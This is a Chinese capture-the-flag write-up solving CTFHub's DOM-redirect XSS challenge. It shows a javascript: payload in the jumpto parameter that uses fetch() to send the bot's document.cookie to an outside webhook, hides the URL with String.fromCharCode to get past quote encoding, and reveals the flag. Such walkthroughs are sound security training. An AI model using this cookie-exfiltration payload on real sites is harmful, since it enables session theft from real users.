---
title: CTFHub-XSS-DOM跳转 Writeup
date: 2026-10-16
category: web
tags:[CTFHub, web, XSS]
---
## 考点分析
DOM型XSS、javascript: 伪协议利用、浏览器地址栏转码绕过（免引号执行）、带外数据（OOB）外带。

## 解题过程

### 漏洞探测与验证

题目提示为DOM跳转，通常意味着前端JS会获取URL中的某个参数，并直接将其作为跳转地址（如 location.href = 参数）。

由于页面输入框为灰色（不可直接输入），我们直接在浏览器地址栏拼接参数进行测试：
http://challenge-75c11dc4d92c5415.sandbox.ctfhub.com:10800/?jumpto=javascript:alert(1)
页面显示成功，确认 jumpto 参数存在，且后端未过滤 javascript: 伪协议，存在DOM型XSS漏洞。

### 常规 Payload 尝试与“转码陷阱”

为了获取Flag（通常在Bot的Cookie中），我们需要将 document.cookie 外带（OOB）到我们的服务器。

尝试的常规 Payload：
?jumpto=javascript:fetch('https://play.hook0.com/.../?c='+document.cookie)

失败原因分析：
提交给Bot后页面白屏，Webhook（Hook0）未收到任何请求。通过F12审查发现，浏览器地址栏会自动将单引号 ' 转码为 %27。导致Bot实际执行的JS代码变成了 fetch(%27https://...%27...)，由于语法错误，JS执行中断，外带失败。

### 绕过策略

为了绕过浏览器的地址栏转码，我们采用以下两个核心策略：

1. 免引号构造：使用 String.fromCharCode() 将URL字符串转换为ASCII码数组，彻底避开单引号。
2. 静默外带：使用 fetch() 替代 location.href 跳转，确保发送请求时页面不会因为跳转而中断代码执行。

# Payload 构造过程：

在浏览器控制台（Console）中执行以下代码生成最终Payload：

```javascript
let webhookUrl = "https://play.hook0.com/in/c_reJ1Tjj2VZBP3MBeX1KNLMczVbR/?c=";
let payload = "javascript:fetch(String.fromCharCode(" + 
  webhookUrl.split('').map(c => c.charCodeAt(0)).join(',') + 
  ")+document.cookie)";
console.log(payload);
```
生成的免引号最终 Payload 为：
javascript:fetch(String.fromCharCode(104,116,116,112,115,58,47,47,...)+document.cookie)

### 最终攻击与获取 Flag

将生成的 Payload 拼接到靶机URL后，最终的完整攻击链接如下（即你刚刚提供的链接）：

```text
http://challenge-75c11dc4d92c5415.sandbox.ctfhub.com:10800/?jumpto=javascript:fetch(String.fromCharCode(104,116,116,112,115,58,47,47,112,108,97,121,46,104,111,111,107,48,46,99,111,109,47,105,110,47,99,95,114,101,74,49,84,106,106,50,86,90,66,80,51,77,66,101,88,49,75,78,76,77,99,122,86,98,82,47,63,99,61)+document.cookie)
```

# 攻击步骤：

1. 将此完整URL复制，粘贴至题目下方的 Send URL to Bot 输入框并提交。
2. 页面提示 Successfully。
3. 回到 Hook0 平台的接收页面（https://play.hook0.com/in/c_reJ1Tjj2VZBP3MBeX1KNLMczVbR/）。
4. 刷新页面，查看最新的请求记录（Request Logs）。
5. 在请求的Query参数 c 中，即可看到Bot带出的Cookie数据，提取出Flag：ctfhub{d88c4486561f1262e3d2a34a}

